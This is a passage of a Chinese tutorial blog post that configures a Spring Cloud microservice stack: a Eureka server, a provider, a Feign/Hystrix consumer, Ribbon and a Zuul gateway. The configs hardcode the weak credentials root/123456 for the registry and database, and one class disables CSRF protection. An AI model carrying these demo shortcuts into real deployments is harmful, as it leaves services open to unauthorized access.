class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.7.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/></span></span> <span class="token comment" spellcheck="true">&lt;!-- lookup parent from repository --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.itheima<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>eureka-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>eureka-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Demo project for Spring Boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-cloud.version</span><span class="token punctuation">></span></span>Greenwich.SR2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-cloud.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-netflix-eureka-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--security安全认证依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-security<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.3.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.netflix.ribbon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>ribbon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencyManagement</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${spring-cloud.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>import<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencyManagement</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repositories</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>spring-milestones<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Spring Milestones<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://repo.spring.io/milestone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repositories</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span></code></pre><h5 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h5><pre class=" language-yml"><code class="language-yml"># 端口server:  port: 8500# 配置服务的名称spring:  application:    name: eureka-server  security: #是否开启用户认证，开启后需要账号密码才能注册，例http://root:123456@127.0.0.1:8501/eureka/    basic:      enabled: true    user:      name: root      password: 123456eureka:  client:    register-with-eureka: false #表示是否向eureka注册中心注册自己    fetch-registry: false #fetch-registry如果为false，则表示自己为注册中心，我的职责就是维护服务实例，并不需要去检索服务    service-url:      defaultZone: http://root:123456@127.0.0.1:8501/eureka/ #监控交互界面，注册中心地址，多个注册中心相互注册形成高可用集群，多个地址通过","分隔  #      defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/       #设置与Eureka Server交互的地址查询服务和注册服务都需要依赖这个地址（单机）。  instance: server1#  instance: #eureka服务端的实例名称#    instance-id: eureka-server #修改eureka上默认的描述信息#    hostname: localhost  server:    enable-self-preservation: false</code></pre><h5 id="WebSecurityConfig-java"><a href="#WebSecurityConfig-java" class="headerlink" title="WebSecurityConfig.java"></a>WebSecurityConfig.java</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>eurekaserver<span class="token punctuation">.</span>crsf<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span>HttpSecurity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>EnableWebSecurity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>WebSecurityConfigurerAdapter<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Created by itcast on 2019/10/31. */</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">class</span> <span class="token class-name">WebSecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>HttpSecurity http<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>http<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//加这句是为了访问eureka控制台和/actuator时能做安全控制</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="EurekaServerApplication-java"><a href="#EurekaServerApplication-java" class="headerlink" title="EurekaServerApplication.java"></a>EurekaServerApplication.java</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>eurekaserveranother<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>SpringApplication<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>SpringBootApplication<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>discovery<span class="token punctuation">.</span>EnableDiscoveryClient<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>netflix<span class="token punctuation">.</span>eureka<span class="token punctuation">.</span>server<span class="token punctuation">.</span>EnableEurekaServer<span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EnableEurekaServer</span> <span class="token comment" spellcheck="true">//服务端启动类，可以接收别人注册进来</span><span class="token annotation punctuation">@EnableDiscoveryClient</span> <span class="token comment" spellcheck="true">//用法上基本与@EnableEurekaClient一致，在服务启动后自动注册到Eureka中，如果是注册中心推荐使用@EnableDiscoveryClient</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EurekaServerApplication</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        SpringApplication<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>EurekaServerApplication<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="2-goods-provider（服务提供者）"><a href="#2-goods-provider（服务提供者）" class="headerlink" title="2.goods-provider（服务提供者）"></a>2.goods-provider（服务提供者）</h4><h5 id="pom-xml-1"><a href="#pom-xml-1" class="headerlink" title="pom.xml"></a>pom.xml</h5><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--eureka依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-netflix-eureka-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h5 id="application-yml-1"><a href="#application-yml-1" class="headerlink" title="application.yml"></a>application.yml</h5><pre class=" language-yml"><code class="language-yml">server:  port: 8750spring:  datasource:    url: jdbc:mysql://127.0.0.1:3306/online_retailers?serverTimezone=GMT%2B8&useUnicode=true&characterEncoding=utf-8    username: root    password: 123456    driver-class-name: com.mysql.cj.jdbc.Driver  application:    name: b2b-goods-provider #在其他提供者与之相同的服务名称，表明提供提供的服务一样，常用于ribbon负载均衡eureka:  client:    service-url:      defaultZone: http://root:123456@localhost:8500/eureka/  instance:    hostname: localhostmybatis:  mapper-locations: classpath:/mapper/*</code></pre><h5 id="GoodsProviderApplication-java"><a href="#GoodsProviderApplication-java" class="headerlink" title="GoodsProviderApplication.java"></a>GoodsProviderApplication.java</h5><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EnableEurekaClient</span> <span class="token comment" spellcheck="true">//在服务启动后自动注册到Eureka中</span></code></pre><h5 id="Controller中方法接收值"><a href="#Controller中方法接收值" class="headerlink" title="Controller中方法接收值"></a>Controller中方法接收值</h5><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//绑定@RequestParam或者@RequestBody </span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/selectActivityById"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> RequestMethod<span class="token punctuation">.</span>GET<span class="token punctuation">)</span>    <span class="token keyword">public</span> Activity <span class="token function">selectActivityById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">)</span>Long id<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> activityDao<span class="token punctuation">.</span><span class="token function">selectActivityById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="3-user-consumer-java-消费者"><a href="#3-user-consumer-java-消费者" class="headerlink" title="3.user-consumer.java(消费者)"></a>3.user-consumer.java(消费者)</h4><h5 id="pom-xml-2"><a href="#pom-xml-2" class="headerlink" title="pom.xml"></a>pom.xml</h5><pre class=" language-xml"><code class="language-xml">        <span class="token comment" spellcheck="true">&lt;!--feign依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-openfeign<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--eureka依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-netflix-eureka-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--thymeleaf前面模板依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.8.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--hystrix熔断依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-netflix-hystrix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h5 id="application-yml-2"><a href="#application-yml-2" class="headerlink" title="application.yml"></a>application.yml</h5><pre class=" language-yml"><code class="language-yml">server:  port: 8893  #服务端口spring:  application:    name: user-consumer   #服务名  main:    allow-bean-definition-overriding: true #遇到同当样名字的时候，是否允许覆盖注册eureka:  client:    service-url:      defaultZone: http://root:123456@localhost:8500/eureka/  #服务注册地址  instance:    hostname: localhostthymeleaf:  cache: false      #关闭缓存  prefix: classpath:/template/  suffix: .html  encoding: UTF-8feign: #feign负载均衡，feign集成ribbon   hystrix:     enabled: true#   httpclient:#     enabled: true</code></pre><h5 id="UserConsumerApplication-java"><a href="#UserConsumerApplication-java" class="headerlink" title="UserConsumerApplication.java"></a>UserConsumerApplication.java</h5><pre><code>@SpringBootApplication@EnableFeignClients@EnableEurekaClient@EnableHystrix</code></pre><h5 id="ActivityService-java"><a href="#ActivityService-java" class="headerlink" title="ActivityService.java"></a>ActivityService.java</h5><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token comment" spellcheck="true">//熔断配置</span><span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"b2b-goods-provider"</span><span class="token punctuation">,</span>fallback <span class="token operator">=</span> ActivityServiceHystix<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ActivityService</span><span class="token punctuation">{</span></code></pre><h5 id="ActivityServiceHystix-java（熔断处理）"><a href="#ActivityServiceHystix-java（熔断处理）" class="headerlink" title="ActivityServiceHystix.java（熔断处理）"></a>ActivityServiceHystix.java（熔断处理）</h5><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//实现并重写接口，在方法内编写熔断处理</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ActivityServiceHystix</span> <span class="token keyword">implements</span> <span class="token class-name">ActivityService</span><span class="token punctuation">{</span></code></pre><h4 id="Ribbon（负载均衡配置）"><a href="#Ribbon（负载均衡配置）" class="headerlink" title="Ribbon（负载均衡配置）"></a>Ribbon（负载均衡配置）</h4><p>在消费者端配置</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RibbonConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token annotation punctuation">@LoadBalanced</span>    <span class="token keyword">public</span> RestTemplate <span class="token function">restTemplate</span><span class="token punctuation">(</span>RestTemplateBuilder builder<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>此时消费端访问服务提供者地址应该是一个地址变量，可能有多个服务提供者（<strong>基于服务名字访问</strong>）</p><p>不用担心访问地址和端口号</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String url <span class="token operator">=</span> <span class="token string">"http://SPRINGCLOUD-PROVIDER-DEPT"</span></code></pre><h4 id="gateway（路由网关）"><a href="#gateway（路由网关）" class="headerlink" title="gateway（路由网关）"></a>gateway（路由网关）</h4><h5 id="pom-xml-3"><a href="#pom-xml-3" class="headerlink" title="pom.xml"></a>pom.xml</h5><pre class=" language-xml"><code class="language-xml">        <span class="token comment" spellcheck="true">&lt;!--zuul网关依赖--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-cloud-starter-netflix-zuul<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h5 id="Application-java"><a href="#Application-java" class="headerlink" title="Application.java"></a>Application.java</h5><pre><code>@EnableZuulProxy</code></pre><h5 id="application-yml-3"><a href="#application-yml-3" class="headerlink" title="application.yml"></a>application.yml</h5><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">zuul</span><span class="token punctuation">:</span>  <span class="token key atrule">host</span><span class="token punctuation">:</span>    <span class="token key atrule">connect-timeout-millis</span><span class="token punctuation">:</span> <span class="token number">60000</span>  <span class="token key atrule">routes</span><span class="token punctuation">:</span>    <span class="token key atrule">api-a</span><span class="token punctuation">:</span>      <span class="token key atrule">path</span><span class="token punctuation">:</span> /api<span class="token punctuation">-</span>a/**      <span class="token key atrule">serviceId</span><span class="token punctuation">:</span> user<span class="token punctuation">-</span>consumer    <span class="token key atrule">api-b</span><span class="token punctuation">:</span>      <span class="token key atrule">path</span><span class="token punctuation">:</span> /api<span class="token punctuation">-</span>b/**      <span class="token key atrule">serviceId</span><span class="token punctuation">:</span> b2b<span class="token punctuation">-</span>goods<span class="token punctuation">-</span>consumer    